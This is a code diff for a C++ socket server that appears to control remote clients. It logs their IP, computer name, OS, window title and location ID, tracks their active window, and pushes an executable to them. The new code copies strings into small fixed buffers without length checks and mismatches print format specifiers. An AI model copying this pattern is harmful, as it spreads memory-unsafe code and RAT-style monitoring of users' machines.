@@ -89,9 +89,21 @@ void handling::Handler(SOCKET socket) {
         wprintf(L"[DEBUG] current_time: %04d-%02d-%02dT%02d:%02d:%02d\n", local_time->tm_year + 1900,
                 local_time->tm_mon + 1, local_time->tm_mday,
                 local_time->tm_hour, local_time->tm_min, local_time->tm_sec);
-        wprintf(L"[DEBUG] INFO_IP: %S\n[DEBUG] INFO_NAME: %S\n[DEBUG] INFO_OS: %S\n[DEBUG] INFO_TITLE: %S\n[DEBUG] INFO_GEOID: %S\n",
-                init_info->ip_address, init_info->computer_name, init_info->os_version, init_info->window_title,
-                init_info->geo_id);
+        wchar_t ip[16];
+        wchar_t name[32];
+        wchar_t os[16];
+        wchar_t title[128];
+        wchar_t id[8];
+
+        util::CharToWchar(ip, init_info->ip_address);
+        util::CharToWchar(name, init_info->computer_name);
+        util::CharToWchar(os, init_info->os_version);
+        util::CharToWchar(title, init_info->window_title);
+        util::CharToWchar(id, init_info->geo_id);
+
+
+        wprintf(L"[DEBUG] ip: %S\n[DEBUG] name: %S\n[DEBUG] os: %S\n[DEBUG] window_title: %S\n[DEBUG] geo_id: %S\n",
+                ip, name, os, title, id);
 #endif
         while (true) {
             if (!main::isActive) {
@@ -121,7 +133,9 @@ void handling::Handler(SOCKET socket) {
                     } else if (result == 0) {
 #ifdef DEBUG
                         wprintf(L"[DEBUG] PONG_RECEIVED!\n");
-                        wprintf(L"[DEBUG] ACTIVE_WINDOW: %S\n", receive_packet.get_data());
+                        wchar_t title[128];
+                        util::CharToWchar(title, receive_packet.get_data());
+                        wprintf(L"[DEBUG] ACTIVE_WINDOW: %S\n", title);
 #endif
                     } else {
                         client_list::Remove(socket);
@@ -160,8 +174,7 @@ void handling::Handler(SOCKET socket) {
 #ifdef DEBUG
         wprintf(L"[DEBUG_TRANSFER] TRANSFER_PACKET\n");
 #endif
-        //get file_handler class from file_handler_list
-        wchar_t path[MAX_PATH] = L"C:\\Users\\LUNAFE\\Desktop\\test.txt";
+        wchar_t path[MAX_PATH] = L"C:\\Users\\LUNAFE\\Desktop\\AutoClick.exe";
         std::thread handle_thread(file_handler::SendFileThread, socket, path);
         handle_thread.join();
     } else {
